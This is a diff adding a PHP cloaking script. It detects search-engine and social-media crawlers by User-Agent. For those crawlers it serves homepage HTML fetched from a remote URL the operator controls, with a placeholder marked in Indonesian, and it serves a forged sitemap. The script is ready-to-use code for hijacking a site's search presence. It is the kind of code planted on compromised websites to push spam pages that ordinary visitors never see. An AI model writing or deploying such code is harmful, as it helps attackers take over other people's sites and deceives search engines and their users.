@@ -1,0 +1,49 @@
+<?php
+function is_bot() {
+    if (empty($_SERVER['HTTP_USER_AGENT'])) return false;
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = [
+        'Googlebot','TelegramBot','bingbot','Google-Site-Verification',
+        'Google-InspectionTool','Baiduspider','YandexBot','DuckDuckBot',
+        'Slurp','facebot','facebookexternalhit','Twitterbot','LinkedInBot',
+        'Applebot','AhrefsBot','SemrushBot','MJ12bot','DotBot','Sogou',
+        'Exabot','PetalBot','SeznamBot','MegaIndex','CCBot','Qwantify',
+        'pinterestbot','Discordbot','WhatsApp','Snapchat'
+    ];
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) return true;
+    }
+    return false;
+}
+
+function generate_sitemap() {
+    $domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
+    $lastmod = date('c');
+    return '<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <url>
+    <loc>' . htmlspecialchars($domain, ENT_QUOTES, 'UTF-8') . '/</loc>
+    <lastmod>' . $lastmod . '</lastmod>
+    <changefreq>hourly</changefreq>
+    <priority>1.0</priority>
+  </url>
+</urlset>';
+}
+
+if (is_bot()) {
+    $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+    if ($uri === '/' || $uri === '') {
+        // Ganti URL ini dengan file yang kamu kontrol sendiri
+        $content = @file_get_contents("MASUKAN URL DISINI");
+        if ($content !== false) {
+            header('Content-Type: text/html; charset=utf-8');
+            echo $content;
+            exit;
+        }
+    } elseif ($uri === '/sitemap.xml') {
+        header('Content-Type: application/xml; charset=utf-8');
+        echo generate_sitemap();
+        exit;
+    }
+}
+?>
